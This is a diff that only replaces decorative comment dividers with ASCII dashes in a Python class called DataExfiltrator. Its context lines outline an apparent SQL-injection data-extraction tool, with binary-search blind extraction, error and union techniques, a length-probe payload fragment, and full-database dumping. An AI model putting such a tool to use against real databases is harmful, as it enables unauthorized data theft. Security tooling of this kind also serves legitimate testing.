@@ -39,7 +39,7 @@ class DataExfiltrator:
             "xml": "<>/=\"'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-.: \t\n",
         }
 
-    # ── Length Detection ──────────────────────────────────────────
+    # -- Length Detection ------------------------------------------
 
     def detect_length(self, test_func: Callable[[int], bool], max_len: int = 255) -> int:
         """Binary search for data length"""
@@ -52,7 +52,7 @@ class DataExfiltrator:
                 low = mid + 1
         return low
 
-    # ── Binary Search Extraction ──────────────────────────────────
+    # -- Binary Search Extraction ----------------------------------
 
     def extract_binary(self, test_func: Callable[[str, int], bool],
                        charset: str = None, length: int = None,
@@ -99,7 +99,7 @@ class DataExfiltrator:
     def _length_payload(self, length: int) -> str:
         return f"LENGTH(@)<=%d" % length
 
-    # ── Parallel Binary Search ────────────────────────────────────
+    # -- Parallel Binary Search ------------------------------------
 
     def extract_parallel(self, test_func: Callable[[str, int], bool],
                          charset: str = None, max_len: int = 255,
@@ -144,7 +144,7 @@ class DataExfiltrator:
             duration=round(duration, 3)
         )
 
-    # ── Chunked Extraction ────────────────────────────────────────
+    # -- Chunked Extraction ----------------------------------------
 
     def extract_chunked(self, query_builder: Callable[[int, int], str],
                         response_parser: Callable[[str], str],
@@ -183,7 +183,7 @@ class DataExfiltrator:
             duration=round(duration, 3)
         )
 
-    # ── Regex Extraction ──────────────────────────────────────────
+    # -- Regex Extraction ------------------------------------------
 
     def extract_regex(self, query: str, pattern: str,
                       flags: int = re.DOTALL) -> ExtractionResult:
@@ -205,7 +205,7 @@ class DataExfiltrator:
             raw_responses=[response[:500]]
         )
 
-    # ── Multi-Technique Extraction ────────────────────────────────
+    # -- Multi-Technique Extraction --------------------------------
 
     def extract_smart(self, query: str, dbms: str, blind_func: Callable = None,
                       error_func: Callable = None, union_func: Callable = None) -> ExtractionResult:
@@ -247,7 +247,7 @@ class DataExfiltrator:
 
         return max(results, key=lambda r: (r.confidence, len(r.data)))
 
-    # ── Batch Extraction ──────────────────────────────────────────
+    # -- Batch Extraction ------------------------------------------
 
     def extract_batch(self, queries: List[str], parser: Callable[[str], str],
                       parallel: bool = True, max_workers: int = 5) -> List[ExtractionResult]:
@@ -268,7 +268,7 @@ class DataExfiltrator:
                     pass
         return results
 
-    # ── Full Database Extraction ──────────────────────────────────
+    # -- Full Database Extraction ----------------------------------
 
     def extract_database(self, db_name: str, table_names: List[str],
                          column_names: List[str], batch_size: int = 50) -> Dict[str, List[ExtractionResult]]:
@@ -289,7 +289,7 @@ class DataExfiltrator:
 
         return all_results
 
-    # ── Adaptive Charset Detection ────────────────────────────────
+    # -- Adaptive Charset Detection --------------------------------
 
     def detect_charset(self, test_func: Callable[[str], bool],
                        candidates: List[str] = None) -> str:
